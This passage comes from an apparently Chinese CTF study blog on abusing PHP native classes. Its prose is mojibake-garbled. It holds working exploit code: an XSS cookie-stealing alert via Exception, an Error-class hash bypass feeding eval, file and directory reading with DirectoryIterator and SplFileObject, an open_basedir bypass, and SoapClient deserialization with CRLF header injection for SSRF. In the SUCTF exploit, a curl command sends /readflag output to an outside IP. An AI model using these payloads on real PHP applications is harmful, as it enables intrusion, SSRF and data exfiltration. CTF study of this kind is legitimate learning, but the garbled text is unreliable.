 Exception(&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;);Echo urlencode(serialize($poc));?&gt;åå¼¹cookie</code></pre><p> å°†å¾—åˆ°çš„ç»“æœä¼ å…¥<br>/?yds_is_so_beautiful=$POC  </p><h1 id="åˆ©ç”¨Error-Exception-å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"><a href="#åˆ©ç”¨Error-Exception-å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ" class="headerlink" title="åˆ©ç”¨Error/Exception å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"></a>åˆ©ç”¨Error/Exception å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ</h1><p> æµ‹è¯•ä»£ç   :</p><pre><code class="php">&lt;?php$a = new Error(&quot;payload&quot;,1);echo $a;</code></pre><p> å‘ç°ä¼šä»¥å­—ç¬¦ä¸²è¿›è¡Œè¾“å‡ºï¼ŒåŒ…æ‹¬å½“å‰çš„é”™è¯¯ä¿¡æ¯payloadä»¥åŠæŠ¥é”™çš„è¡Œå·2ï¼Œä¼ å…¥ Error(â€œpayloadâ€,1) ä¸­çš„é”™è¯¯ä»£ç â€œ1â€åˆ™æ²¡æœ‰è¾“å‡ºå‡ºæ¥ã€‚  </p><pre><code class="php">&lt;?php$a = new Error(&quot;payload&quot;,1);$b = new Error(&quot;payload&quot;,2);echo $a;echo &quot;\r\n\r\n&quot;;echo $b;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898879803-a51766b8-316d-464b-83a4-2f80e33e69a3.png" alt="image.png"><br> $a å’Œ $b è¿™ä¸¤ä¸ªé”™è¯¯å¯¹è±¡æœ¬èº«æ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯ __toString æ–¹æ³•è¿”å›çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚<br>å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹æ³•æœç„¶å“ˆå¸Œæ¯”è¾ƒã€‚  </p><h2 id="2020-æå®¢å¤§æŒ‘æˆ˜-Greatphp"><a href="#2020-æå®¢å¤§æŒ‘æˆ˜-Greatphp" class="headerlink" title="[2020 æå®¢å¤§æŒ‘æˆ˜]Greatphp"></a><strong>[2020 æå®¢å¤§æŒ‘æˆ˜]Greatphp</strong></h2><p> è€ƒç‚¹ï¼šphpå†…ç½®ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒã€phpå–åç»•è¿‡  </p><pre><code class="php">&lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if(($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#39;/&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;                   &#125;    &#125;&#125;if (isset($_GET[&#39;great&#39;]))&#123;    unserialize($_GET[&#39;great&#39;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p> è¦æ˜¯å¸¸è§çš„phpé¢˜ç›®ï¼Œå¯ä»¥æ•°ç»„ç»•è¿‡å¼ºç±»å‹ã€‚åœ¨è¿™é¢˜ç›®ä¸­ï¼Œéœ€è¦Errorç±»ã€‚<br>ä¸»è¦æ˜¯ç»•è¿‡è¿™ä¸ª</p><pre><code class="php">if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)))</code></pre><p> md5()å’Œsha1()å¯ä»¥å¯¹ä¸€ä¸ªç±»è¿›è¡Œhashï¼Œå¹¶ä¸”ä¼šè§¦å‘è¿™ä¸ªç±»çš„ __toString æ–¹æ³•ï¼›ä¸”å½“eval()å‡½æ•°ä¼ å…¥ä¸€ä¸ªç±»å¯¹è±¡æ—¶ï¼Œä¹Ÿä¼šè§¦å‘è¿™ä¸ªç±»é‡Œçš„ __toString æ–¹æ³•ã€‚<br>æˆ‘ä»¬å…ˆæ¥æµ‹è¯•ä¸€ä¸‹:<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665202986018-e4a18f5f-99ca-4689-96f4-aba268382f66.png" alt="img"><br>æ³¨æ„ä¸¤ä¸ªErrorè¦åœ¨åŒä¸€è¡Œå“¦ï¼Œå¦åˆ™ä»–ä»¬æŠ¥é”™çš„è¾“å‡ºæœ‰è¡Œæ•°çš„ä¸åŒï¼<br>payload:</p><pre><code class="php">&lt;?phpclass SYCLOVER &#123;    public $syc;    public $lover;&#125;//$cmd = &quot;flag.php&quot;;//$str = urlencode(~$cmd);  %99%93%9E%98%D1%8F%97%8F$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;//print $str;echo &quot;\r\n\r\n&quot;;$c = new SYCLOVER();$c-&gt;syc = new Error($str,1);$c-&gt;lover=new Error($str,2);echo urlencode(serialize($c));?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665212087693-85115409-6be8-4971-9941-dda917bee1d0.png" alt="img"><br>è¿™é‡Œå…¶å®æœ‰ä¸€ä¸ªåœ°æ–¹è¦æ³¨æ„:</p><pre><code class="php">$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%99%93%9E%98%D1%8F%97%8F&quot;).&quot;?&gt;&quot;;</code></pre><p>ä¸ºä»€ä¹ˆæœ€å‰é¢è¦åŠ ä¸Š?&gt;å‘¢<br>æˆ‘ä»¬è¿˜è®°å¾—Errorç±»è¿”å›ä»€ä¹ˆå—?<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665212238513-51947da1-c5af-4d50-bc72-e700f1a297b9.png" alt="img"><br>Erroræ˜¯æ— æ³•ç›´æ¥è¿”å›æˆ‘ä»¬æ‰€éœ€è¦çš„paylaodçš„ï¼Œå®ƒå‰é¢æœ‰Error:å½±å“ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨&gt;?å»é—­åˆå®ƒ<br>æœ€ç»ˆæˆ‘ä»¬çš„è¯­å¥å°±å˜ä¸º:</p><pre><code class="php">eval(&quot;Error:?&gt;&lt;?=include &#39;flag.php&#39;?&gt;xxxxxxx&quot;)</code></pre><p>è¿™æ ·å®é™…ä¸Šæ˜¯ä¸å½±å“è¯­å¥çš„æ‰§è¡Œ</p><h1 id="å¯éå†ç›®å½•ç±»"><a href="#å¯éå†ç›®å½•ç±»" class="headerlink" title="å¯éå†ç›®å½•ç±»"></a>å¯éå†ç›®å½•ç±»</h1><h2 id="Directorylterator"><a href="#Directorylterator" class="headerlink" title="Directorylterator"></a>Directorylterator</h2><pre><code class="php">ç‰ˆæœ¬ï¼šphp5ã€php7ã€php8Filesystemlteratorç‰ˆæœ¬ï¼šPHP 5 &gt;= 5.3.0, PHP 7, PHP 8</code></pre><pre><code class="php">&lt;?php highlight_file(__file__); $dir=$_GET[&#39;cmd&#39;]; $a=new DirectoryIterator($dir); foreach($a as $f)&#123;     echo($f -&gt; __toString().&quot;&lt;br&gt;&quot;);      &#125; ?&gt; </code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665216764271-1ae96322-73a5-4f13-a57c-9107ab60b212.png" alt="img"><br> æŸ¥çœ‹è¯¥ç±»ï¼Œå‘ç°__toString()æ–¹æ³•<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665217135566-8285ea34-f95a-4dba-a8c0-0f866120c9f4.png" alt="img"><br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665217175171-fec85446-9c96-432a-99df-28d5635fa417.png" alt="img"><br> ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚å½“æ‰§è¡Œåˆ°echoå‡½æ•°æ—¶ï¼Œä¼šè§¦å‘DirectoryIteratorç±»ä¸­çš„toString() æ–¹æ³•ï¼Œè¾“å‡ºæŒ‡å®šç›®å½•é‡Œé¢ç»è¿‡æ’åºä¹‹åçš„ç¬¬ä¸€ä¸ªæ–‡ä»¶å é…åˆglob://åè®®ä½¿ç”¨æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æˆ‘ä»¬æƒ³è¦çš„æ–‡ä»¶è·¯å¾„ </p><h2 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h2><p>FilesystemIterator ç±»ä¸ DirectoryIterator ç±»ç›¸åŒï¼Œæä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£ã€‚è¯¥ç±»çš„æ„é€ æ–¹æ³•å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨ã€‚<br>è¯¥ç±»çš„ä½¿ç”¨æ–¹æ³•ä¸DirectoryIterator ç±»ä¹Ÿæ˜¯åŸºæœ¬ç›¸åŒçš„ï¼š(å­ç±»ä¸çˆ¶ç±»çš„å…³ç³»)</p><pre><code class="php">&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218139607-9e586dc8-c57f-411b-a0d7-e17dc51fac18.png" alt="img"><br>éå†ä¸€ä¸‹</p><pre><code class="php">&lt;?php$dir=new FilesystemIterator(&quot;/&quot;);echo $dir;foreach($dir as $tmp)&#123;    echo($tmp.&#39;&lt;br&gt;&#39;);    echo &quot;\n&quot;;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218128602-a7225ff2-4bc6-4903-9fad-3fac2139d6f7.png" alt="img"></p><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h2><p> SplFileObject ç±»å’Œ SplFileinfoä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œç­‰<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218238132-374592ac-faae-4784-b50a-798f1e5fc2fa.png" alt="img"></p><pre><code class="php">    &lt;?php    $dir=new SplFileObject(&quot;flag.php&quot;);    echo $dir;    ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218317940-59dff161-d172-4b69-9e72-ce88967e8562.png" alt="img"><br> å¯¹æ–‡ä»¶ä¸­çš„æ¯ä¸€è¡Œå†…å®¹è¿›è¡Œéå†ï¼š  </p><pre><code class="php">&lt;?php$dir = new SplFileObject(&quot;flag.php&quot;);foreach($dir as $tmp)&#123;    echo ($tmp.&#39;&lt;br&gt;&#39;);&#125;?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218391694-fb13c795-3987-47a3-8a36-165697809110.png" alt="img"><br>å‡ºé¢˜çš„æ—¶å€™å¦‚æœçœ‹åˆ°å½¢å¦‚:</p><pre><code class="php">    echo new $this-&gt;key($this-&gt;value);      $this -&gt; a = new $this-&gt;key($this-&gt;value);    echo $this-&gt;a;</code></pre><p> åªéœ€è¦è®©**$this-&gt;key<strong>å€¼èµ‹ä¸ºæˆ‘ä»¬æƒ³ç”¨åŸç”Ÿå‡½æ•°ï¼Œ</strong>$this-&gt;value**èµ‹ä¸ºè·¯å¾„ï¼ŒæŸ¥å°±è¡Œäº†ã€‚ä½†æ˜¯è¿™ç§æ„é€ ç±»å‹çš„æ–¹æ³•çš„å±€é™æ€§å°±æ˜¯åªèƒ½æŸ¥ä¸€ä¸ªè·¯å¾„ä¸Šçš„ä¸€ä¸ªæ–‡ä»¶ã€‚  </p><pre><code class="php">&lt;?phpclass HY&#123;    public $a;    public $b;&#125;$c = new HY();$c-&gt;a=&quot;SplFileObject&quot;;$c-&gt;b=&quot;flag.php&quot;;echo new $c-&gt;a($c-&gt;b);?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665218812533-da081255-65fe-494e-b0e4-ae13eb6c2b7d.png" alt="img"></p><h1 id="çªç ´open-basedirçš„é™åˆ¶"><a href="#çªç ´open-basedirçš„é™åˆ¶" class="headerlink" title="çªç ´open_basedirçš„é™åˆ¶"></a>çªç ´open_basedirçš„é™åˆ¶</h1><p> ctfshow web74  </p><pre><code class="php">&lt;?phperror_reporting(0);ini_set(&#39;display_errors&#39;, 0); // ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿif(isset($_POST[&#39;c&#39;]))&#123;    $c=$_POST[&#39;c&#39;];    eval($c);    $s=ob_get_contents();    ob_end_clean();    echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123;    highlight_file(__FILE__); &#125; ?&gt;?&gt;</code></pre><p>é¦–å…ˆä»‹ç»ä¸€ä¸‹ob_get_contents()å’Œob_end_cleanè¿™ä¸¤ä¸ªå‡½æ•°ã€‚<br>ç¼“å†²åŒº(Buffer)å°±æ˜¯åœ¨å†…å­˜ä¸­é¢„ç•™æŒ‡å®šå¤§å°çš„å­˜å‚¨ç©ºé—´ç”¨æ¥å¯¹I/Oçš„æ•°æ®åšä¸´æ—¶å­˜å‚¨ï¼Œè¿™éƒ¨åˆ†é¢„ç•™çš„å†…å­˜ç©ºé—´å«ç¼“å†²åŒºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨å†…å­˜ç©ºé—´ä¸­é¢„ç•™äº†ä¸€å®šçš„å­˜å‚¨ç©ºé—´ï¼Œè¿™äº›å­˜å‚¨ç©ºé—´ç”¨æ¥ç¼“å†²è¾“å…¥æˆ–è¾“å‡ºçš„æ•°æ®ï¼Œè¿™éƒ¨åˆ†é¢„ç•™çš„ç©ºé—´å°±å«åšç¼“å†²åŒºã€‚<br>ç¼“å†²åŒºæ ¹æ®å…¶å¯¹åº”çš„æ˜¯è¾“å…¥è®¾å¤‡è¿˜æ˜¯è¾“å‡ºè®¾å¤‡ï¼Œåˆ†ä¸ºè¾“å…¥ç¼“å†²åŒºå’Œè¾“å‡ºç¼“å†²åŒºã€‚<br>ob_get_contents:è¿”å›è¾“å‡ºç¼“å†²åŒºçš„å†…å®¹ï¼Œåªæ˜¯å¾—åˆ°ç¼“å†²åŒºçš„å†…å®¹ï¼Œä½†ä¸æ¸…é™¤å®ƒã€‚<br>ob_end_clean:æ¸…ç©ºï¼ˆæ“¦é™¤ï¼‰ç¼“å†²åŒºå¹¶å…³é—­è¾“å‡ºç¼“å†²ã€‚<br>evalæ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤åï¼Œè¾“å‡ºflagå†…å®¹ï¼Œä½†æ˜¯è¾“å‡ºè¦ç»è¿‡ç¼“å†²åŒºï¼Œå¯¹è¾“å‡ºæ•°æ®è¿›è¡Œç¼“å­˜ï¼Œé€šè¿‡ob_get_contents() åŸæ¥çš„æ•°æ®èµ‹å€¼ç»™äº†$sï¼Œç„¶ååˆç”¨ob_end_cleanå°†ç¼“å†²åŒºæ¸…ç©ºäº†ï¼Œé‚£ä¹ˆevalå°±æ²¡åŠæ³•è¾“å‡ºäº†ï¼ˆç¼“å†²åŒºéƒ½è¢«æ¸…ç©ºäº†ï¼‰ï¼Œæ‰€ä»¥å°±åªæœ‰$sä¸€ä¸ªè¾“å‡ºäº†ã€‚æ‰€ä»¥è¿™é‡Œå¯ä»¥é€šè¿‡exit()æˆ–è€…die() ï¼ˆexitåˆ«åï¼‰é€€å‡ºï¼Œè¿™æ ·çš„è¯å°±æ²¡æœ‰ob_end_cleanè¿™ä¸ªç¼“å†²åŒºæ¸…ç©ºæ“ä½œï¼Œè¾“å‡ºå°±èƒ½æ­£å¸¸è¾“å‡ºã€‚<br><strong>æ„é€ payload:</strong></p><pre><code class="php">c=?&gt;&lt;?php$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#39; &#39;);&#125; exit(0);?&gt;</code></pre><p>ç„¶åè¯»å–æ–‡ä»¶</p><pre><code class="php">&gt;c=include(&#39;/flagx.txt&#39;);exit();</code></pre><h1 id="åˆ©ç”¨SoapClientç±»è¿›è¡ŒCRLF-SSRF"><a href="#åˆ©ç”¨SoapClientç±»è¿›è¡ŒCRLF-SSRF" class="headerlink" title="åˆ©ç”¨SoapClientç±»è¿›è¡ŒCRLF+SSRF"></a>åˆ©ç”¨SoapClientç±»è¿›è¡ŒCRLF+SSRF</h1><p> soapClientï¼šä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®WebæœåŠ¡çš„ PHP å®¢æˆ·ç«¯ã€‚<br>ç±»ä»‹ç»ï¼š  </p><pre><code class="php">SoapClient &#123;    /* æ–¹æ³• */    public __construct ( string|null $wsdl , array $options = [] )    public __call ( string $name , array $args ) : mixed    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null    public __getCookies ( ) : array    public __getFunctions ( ) : array|null    public __getLastRequest ( ) : string|null    public __getLastRequestHeaders ( ) : string|null    public __getLastResponse ( ) : string|null    public __getLastResponseHeaders ( ) : string|null    public __getTypes ( ) : array|null    public __setCookie ( string $name , string|null $value = null ) : void    public __setLocation ( string $location = &quot;&quot; ) : string|null    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed&#125;</code></pre><p> å­˜åœ¨_ _callæ–¹æ³•ï¼Œå½“__callæ–¹æ³•è¢«è§¦å‘ï¼Œå¯ä»¥å‘é€HTTPå’ŒHTTPSè¯·æ±‚ã€‚ä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚è€Œ__callè§¦å‘å¾ˆç®€å•ï¼Œå°±æ˜¯å½“å¯¹è±¡è®¿é—®ä¸å­˜åœ¨çš„æ–¹æ³•çš„æ—¶å€™å°±ä¼šè§¦å‘ã€‚  </p><pre><code class="php">å‡½æ•°å½¢å¼ï¼š    public SoapClient :: SoapClient(mixed $wsdl [ï¼Œarray $options ])ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæŒ‡æ˜æ˜¯å¦ä¸ºwsdlæ¨¡å¼ï¼Œä¸ºnullåˆ™ä¸ºéwsdlæ¨¡å¼wsdlï¼Œå°±æ˜¯ä¸€ä¸ªxmlæ ¼å¼çš„æ–‡æ¡£ï¼Œç”¨äºæè¿°Web Serverçš„å®šä¹‰ç¬¬äºŒä¸ªå‚æ•°ä¸ºarrayï¼Œwsdlæ¨¡å¼ä¸‹å¯é€‰ï¼›éwsdlæ¨¡å¼ä¸‹ï¼Œéœ€è¦è®¾ç½®locationå’Œuriï¼Œlocationå°±æ˜¯å‘é€SOAPæœåŠ¡å™¨çš„URLï¼Œuriæ˜¯æœåŠ¡çš„å‘½åç©ºé—´</code></pre><p> é¦–å…ˆæµ‹è¯•ä¸‹æ­£å¸¸æƒ…å†µä¸‹çš„SoapClientç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨__callæ–¹æ³•  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://108.166.201.16:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665298510417-609387c8-6763-4ca9-922c-69419dae6f1d.png" alt="img"></p><h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><p> ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼ŒSOAPActionå¤„å¯æ§ï¼Œå¯ä»¥æŠŠ\x0d\x0aæ³¨å…¥åˆ°SOAPActionï¼ŒPOSTè¯·æ±‚çš„headerå°±å¯ä»¥è¢«æ§åˆ¶  </p><pre><code class="php">&lt;?php$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &#39;location&#39;=&gt;&#39;http://127.0.0.1:5555/path&#39;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;not_exists_function();</code></pre><p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç”¨æ¥æŒ‡æ˜æ˜¯å¦æ˜¯ wsdl æ¨¡å¼ã€‚<br>ç¬¬äºŒä¸ªå‚æ•°ä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå¦‚æœåœ¨ wsdl æ¨¡å¼ä¸‹ï¼Œæ­¤å‚æ•°å¯é€‰ï¼›å¦‚æœåœ¨é wsdl æ¨¡å¼ä¸‹ï¼Œåˆ™å¿…é¡»è®¾ç½® location å’Œ uri é€‰é¡¹ï¼Œå…¶ä¸­ location æ˜¯è¦å°†è¯·æ±‚å‘é€åˆ°çš„ SOAP æœåŠ¡å™¨çš„ URLï¼Œè€Œ uri æ˜¯ SOAP æœåŠ¡çš„ç›®æ ‡å‘½åç©ºé—´ã€‚å…·ä½“å¯ä»¥è®¾ç½®çš„å‚æ•°å¯è§å®˜æ–¹æ–‡æ¡£<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299010016-b134387a-88ae-4b19-9b14-e495c2acd225.png" alt="img"></p><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299033504-8234fdf2-329e-4b4c-ac0b-3512136fc295.png" alt="img"></p><p>ä½†Content-Typeåœ¨SOAPActionçš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶Content-Typ,ä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ®<br>åœ¨headeré‡ŒUser-Agentåœ¨Content-Typeå‰é¢</p><pre><code class="php">https://www.php.net/manual/zh/soapclient.soapclient.php :The user_agent option specifies string to use in User-Agent header.</code></pre><p>user_agentåŒæ ·å¯ä»¥æ³¨å…¥CRLFï¼Œæ§åˆ¶Content-Typeçš„å€¼</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1:5555/path&#39;;$post_string = &#39;data=something&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=my_session&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo $aaa;$c = unserialize($aaa);$c-&gt;not_exists_function();?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299220045-7fa39f85-3c66-4929-a97b-cf08e1d6a3a0.png" alt="img"></p><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665299243252-81156156-b050-4637-bea8-54bd0d302863-166888019827967.png" alt="img"></p><p>å¦‚ä¸Šï¼Œä½¿ç”¨SoapClient<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">ååºåˆ—åŒ–</a>+CRLF<strong>å¯ä»¥ç”Ÿæˆä»»æ„POSTè¯·æ±‚</strong>ã€‚<br><strong>Deserialization + __call + SoapClient + CRLF = SSRF</strong></p><h2 id="N1CTF-2018-easy-harder-php"><a href="#N1CTF-2018-easy-harder-php" class="headerlink" title="[N1CTF 2018]easy_harder_php"></a><a href="http://www.baidu.com/link?url=oGo5steYSGhrbjjf_RBqktmzUnvWTpUIj4QV7riBUNNxIkL67bsln8HTZAfs1lSXeqgf39HGtT9BCjt2N1fTb6v4mJacdeZcQvE8whLwuvm&wd=&eqid=f4d6d11600082915000000056342763d">[N1CTF 2018]easy_harder_php</a></h2><p><a href="https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</a><br>(æˆ‘è¿™é‡Œæƒ³å¤ç°ä¸€ä¸‹ï¼Œæ„Ÿè§‰codeé‚£é‡Œæœ‰é—®é¢˜ï¼Œæ— æ³•è¿›è¡Œæ³¨å†Œå’Œç™»å½•æ“ä½œ)<br>æ‹¿åˆ°adminå¯†ç ä¹‹åï¼Œéœ€è¦ä»127.0.0.1ç™»é™†ï¼Œç”¨åˆ°SSRFï¼Œé€šè¿‡æ³¨å…¥a`, {serialize object});#å¼•å‘ååºåˆ—åŒ–æ¼æ´<br><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665328994027-84c31d48-8cd3-4d0d-b1cd-b093727e4019.png" alt="img"><br>ååºåˆ—åŒ–åçš„SoapClientå¯¹è±¡å»è°ƒç”¨ä¸å­˜åœ¨çš„getcountryæ–¹æ³•ï¼Œè°ƒç”¨__callï¼Œå®ç°SSRF<br>æ§åˆ¶PHPSESSIDä¸ºè‡ªå·±çš„sessionï¼ŒSSRFæ¥è¿›è¡Œadminç™»é™†</p><pre><code class="php">&lt;?php$target = &#39;http://127.0.0.1/index.php?action=login&#39;;$post_string = &#39;username=admin&amp;password=nu1ladmin&amp;code=cf44f3147ab331af7d66943d888c86f9&#39;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,    &#39;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#39;    );$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;      =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#39;^^&#39;,&quot;\r\n&quot;,$aaa);$aaa = str_replace(&#39;&amp;&#39;,&#39;&amp;&#39;,$aaa);echo bin2hex($aaa);?&gt;</code></pre><p> å†ä½¿ç”¨ä¸Šé¢çš„PHPSESSIDè®¿é—®ï¼Œå°±æ˜¯adminäº†  </p><h2 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h2><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1665421499752-266b58e3-9414-4291-b9c6-c3b67e187013.png" alt="img"><br>è¿™é‡Œåªå…è®¸æœ¬åœ°è®¿é—®ï¼Œæˆ‘ä»¬è¦è¿›è¡Œssrf<br>æ„é€ exp:</p><pre><code class="php">&lt;?phpclass File&#123;    public $file_name;    public $func = &quot;SoapClient&quot;;    function __construct($file_name)&#123;        $this-&gt;file_name = $file_name;    &#125;&#125;$target = &#39;http://127.0.0.1/admin.php&#39;;$post_string = &#39;admin=1&amp;cmd=curl &quot;http://108.166.201.16:888&quot;.&quot;?`/readflag`&quot;&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&#39;. &quot;\r\n&quot;;$headers = array(    &#39;X-Forwarded-For: 127.0.0.1&#39;,);$f = [null, array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;urldecode(str_replace(&#39;^^&#39;,&#39;%0d%0a&#39;,&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;.(string)strlen($post_string).&#39;^^^^&#39;.$post_string)),&#39;uri&#39;=&gt; &quot;user&quot;)];@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); 